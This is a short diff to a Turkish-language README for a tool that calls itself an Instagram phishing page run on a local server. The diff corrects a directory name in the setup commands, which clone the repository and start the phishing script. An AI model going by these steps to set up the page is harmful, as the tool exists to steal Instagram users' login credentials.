@@ -34,7 +34,7 @@ Bu proje yerel bir sunucu üzerinde çalışan bir instagram oltalama sayfasıd�
 1. Açtığınız terminale bu komutları girin ve programı aktif edin
 
 - git clone https://github.com/ghost0x02/instagram-phishing
-- cd instagram phishing
+- cd instagram-phishing
 - python3 instagram-phishing.py start
 ```
 ```
